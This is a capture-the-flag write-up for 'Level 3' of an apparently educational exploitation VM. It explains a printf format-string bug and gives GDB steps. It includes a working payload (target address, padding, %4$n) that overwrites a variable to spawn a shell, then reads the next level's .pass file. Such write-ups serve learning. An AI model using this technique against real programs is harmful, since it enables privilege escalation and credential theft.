# LEVEL 3

## 💡 Explanation

In this level we have to:
1. Having a look to the main we can see that there's a call to the function `v`. This function is pretty simple to understand: (1)it asks for input calling to `fgets`, (2) it prints what has been read using `printf`, (3) compares the variable `m` to 0x40 (64 in decimal) and (4) if the comparison evaluates to true, it printfs "Wait what?!" and opens a shell by doing a call to `system`.
2. Obviously, what we have to do is to manage set the variable `m` to 64, so the program get's in the comparison and opens a terminal. We can not exploit the `fgets` because this function is protected against buffer overflows; therefore what we are going to exploit is `printf`.
3. We first have to test that actually we can pass to printf a formatting string and that it'll process it. We can do that by trying to get direct access to the stack by using `"Hello my name is %p"`. It works!
4. Now, we have to find out where does printf starts writing. To do so we can pass a string formatted with a code that we know (for example "AAAA" == 0x41414141) followed by a lot of `"%p"`. We see that the 0x41414141 appears as the 4th element in the stack, meaning that we can use this to save the `m` variable address as the 4th element in the stack.
5. Last thing: we have to manage is how to write the value "64" on `m`... To do so we are going to use the formatter `%n` which receives as a parameter the position in the stack were it is going to read (our case is the 4th position on the stack == `$4`) and writes on it the number of characters written before reaching this formatter. We have to build an exploit like: [ADDRESS M][RANDOM CHARS][%N FORMATTER TO $4] where the first two part have to have a length of 64 bytes!

## 👾 Commands

To find the solution:
```
[GDB] disas main
[GDB] disas v
[GDB] b *0x080484df => it is right before the cmp, so we can set the eax to 0x40
[GDB] info variables => get the address of the variable m
[GDB] set ($eax) = 0x40 => step to see how we get in the if
[GDB] b *0x08048513 => right before the call to system, we'll see in the stack "/bin/bash"
[VM]  python -c 'print "Hello my name is %p"' | /home/user/level3/level3
[VM]  python -c 'print "AAAA %p %p %p %p %p %p %p"' | /home/user/level3/level3
[VM]  python -c 'print "\x8c\x98\x04\x08 %p %p %p %p"' | /home/user/level3/level3
```

To execute the solution:
- `(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' ; cat - ) | /home/user/level3/level3`
- `cd /home/user/level4`
- `cat .pass`

## 🔍 Resources

- [Chaine de format - introduction](https://www.root-me.org/fr/Documentation/Applicatif/Chaine-de-format-introduction)
- [Chaine de format - lecture en mémoire](https://www.root-me.org/fr/Documentation/Applicatif/Chaine-de-format-lecture-en-memoire)
- [Chaine de format - écriture en mémoire](https://www.root-me.org/fr/Documentation/Applicatif/Chaine-de-format-ecriture-en-memoire)
- [Format String Exploitation-Tutorial](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)
- [How to Write Specific Values to Memory with Format String Exploitation](https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/)
- [Une simple Exploitation de vulnérabilité Format String](https://www.exploit-db.com/papers/23985)
